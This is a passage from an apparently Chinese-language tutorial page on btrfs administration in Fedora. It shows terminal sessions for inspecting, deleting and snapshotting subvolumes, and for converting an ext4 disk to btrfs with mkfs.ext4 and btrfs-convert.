<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        Send</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> time:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">              2023-01-13</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 17:22:38</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> +0800</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        Receive</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> transid:</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">        0</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        Receive</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> time:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">           -</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        Snapshot(s</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">):</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@fedora ~]# btrfs subvolume show /data/logs</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">logs</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        Name:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">                   logs</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        UUID:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">                   2b85bcf8-9302-0f47-86c1-cc95d34f371b</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        Parent</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> UUID:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">            -</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        Received</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> UUID:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">          -</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        Creation</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> time:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">          2023-01-13</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 17:22:38</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> +0800</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        Subvolume</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ID:</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">           256</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        Generation:</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">             77</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        Gen</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> at</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> creation:</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">        75</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        Parent</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ID:</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">              5</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        Top</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> level</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ID:</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">           5</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        Flags:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">                  -</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        Send</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> transid:</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">           0</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        Send</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> time:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">              2023-01-13</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 17:22:38</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> +0800</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        Receive</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> transid:</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">        0</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        Receive</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> time:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">           -</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        Snapshot(s</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">):</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@fedora ~]#</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># 如果子卷重名 使用子卷id进行挂载</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2>删除子卷</h2>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@fedora ~]# btrfs subvolume delete /mnt/logs</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Delete</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> subvolume</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> (no-commit): </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">'/mnt/logs'</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@fedora ~]#</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2>创建 Snapshot</h2>
<p>下面的例子中，创建快照 snap1 时系统存在 2 个文件。创建快照之后，对 test1 的内容进行修改。再回到 snap1，打开 test1 文件，可以看到 test1 的内容依旧是之前的内容。</p>
<div class="language-text line-numbers-mode" data-highlighter="shiki" data-ext="text" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-text"><span class="line"><span>[root@fedora ~]# btrfs subvolume snapshot /mnt/cache/ /mnt/cache_snapshot</span></span>
<span class="line"><span>Create a snapshot of '/mnt/cache/' in '/mnt/cache_snapshot'</span></span>
<span class="line"><span>[root@fedora ~]#</span></span>
<span class="line"><span></span></span>
<span class="line"><span></span></span>
<span class="line"><span></span></span>
<span class="line"><span></span></span>
<span class="line"><span>#ls /btrfsdisk </span></span>
<span class="line"><span> test1 test2 </span></span>
<span class="line"><span> #vi test1 </span></span>
<span class="line"><span> This is a test </span></span>
<span class="line"><span> #btrfsctl – s snap1 /btrfsdisk </span></span>
<span class="line"><span> #vi test1 </span></span>
<span class="line"><span> Test1 is modified </span></span>
<span class="line"><span> #cd /btrfsdisk/snap1 </span></span>
<span class="line"><span> #cat test1 </span></span>
<span class="line"><span> This is a test</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>可以从上面的例子看到，快照 snap1 保存的内容不会被后续的写操作所改变。</p>
<h2>btrfs，ext4文件系统相互转化</h2>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@fedora ~]# lsblk</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">NAME</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">                            MAJ:MIN</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> RM</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  SIZE</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> RO</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> TYPE</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> MOUNTPOINTS</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">sr0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">                              11:0</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">    1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  1.6G</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">  0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> rom</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">zram0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">                           252:0</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">    0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  3.8G</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">  0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> disk</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> [SWAP]</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">nvme0n1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">                         259:0</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">    0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">   50G</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">  0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> disk</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">├─nvme0n1p1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">                     259:1</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">    0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    1M</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">  0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> part</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">├─nvme0n1p2</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">                     259:2</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">    0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    1G</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">  0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> part</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /boot</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">└─nvme0n1p3</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">                     259:3</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">    0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">   49G</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">  0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> part</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">  └─fedora_localhost--live-root</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 253:0</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">    0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">   49G</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">  0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> lvm</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  /</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">nvme0n2</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">                         259:4</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">    0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">   20G</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">  0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> disk</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /data/logs</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">                                                         /mnt</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">nvme0n3</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">                         259:5</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">    0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">   20G</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">  0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> disk</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">nvme0n4</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">                         259:6</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">    0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">   20G</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">  0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> disk</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">nvme0n5</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">                         259:7</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">    0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">   20G</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">  0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> disk</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">nvme0n6</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">                         259:8</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">    0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">   20G</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">  0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> disk</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@fedora ~]# mkfs.ext4 /dev/nvme0n5</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">mke2fs</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1.46.5</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> (30-Dec-2021)</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">/dev/nvme0n5</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> contains</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> a</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ext4</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> file</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> system</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        created</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> on</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Fri</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Jan</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 13</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 17:46:54</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 2023</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Proceed</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> anyway?</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> (y,N) y</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Creating</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> filesystem</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> with</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 5242880</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 4k</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> blocks</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> and</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1310720</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> inodes</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Filesystem</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> UUID:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> d0f52ff3-b84a-4698-bb69-208d550a4b57</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Superblock</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> backups</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> stored</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> on</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> blocks:</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        32768,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 98304,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 163840,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 229376,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 294912,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 819200,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 884736,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 1605632,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 2654208,</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        4096000</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Allocating</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> group</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> tables:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> done</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Writing</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> inode</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> tables:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> done</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Creating</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> journal</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> (32768 </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">blocks</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">): </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">done</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Writing</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> superblocks</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> and</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> filesystem</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> accounting</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> information:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> done</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@fedora ~]# mount /dev/nvme0n5 /ext4/</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@fedora ~]# df -h</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Filesystem</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">                               Size</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  Used</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Avail</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Use%</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Mounted</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> on</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">devtmpfs</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">                                 4.0M</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">     0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  4.0M</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">   0%</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /dev</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">tmpfs</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">                                    1.9G</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">     0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  1.9G</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">   0%</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /dev/shm</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">tmpfs</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">                                    777M</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  1.7M</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  775M</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">   1%</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /run</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">/dev/mapper/fedora_localhost--live-root</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">   48G</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  4.9G</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">   41G</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  11%</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">tmpfs</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">                                    1.9G</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">   16K</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  1.9G</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">   1%</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /tmp</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">/dev/nvme0n1p2</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">                           974M</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  243M</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  664M</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  27%</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /boot</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">tmpfs</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">                                    389M</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">   88K</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  389M</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">   1%</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /run/user/0</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">/dev/nvme0n2</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">                              57G</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  4.2M</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">   57G</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">   1%</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /mnt</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">/dev/nvme0n2</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">                              57G</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  4.2M</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">   57G</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">   1%</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /data/logs</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">/dev/nvme0n5</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">                              20G</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">   24K</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">   19G</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">   1%</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /ext4</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@fedora ~]# echo 111 &gt; /ext4/111</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@fedora ~]# btrfs</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">btrfs</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">               btrfs-convert</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">       btrfs-image</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">         btrfs-select-super</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">btrfsck</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">             btrfs-find-root</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">     btrfs-map-logical</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">   btrfstune</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@fedora ~]# umount /ext4</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@fedora ~]# btrfs-convert /dev/nvme0n5</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">btrfs-convert</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> from</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> btrfs-progs</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> v6.0</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Source</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> filesystem:</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">  Type:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">           ext2</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">  Label:</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">  Blocksize:</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">      4096</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">  UUID:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">           d0f52ff3-b84a-4698-bb69-208d550a4b57</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Target</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> filesystem:</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">  Label:</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">  Blocksize:</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">      4096</span></span>
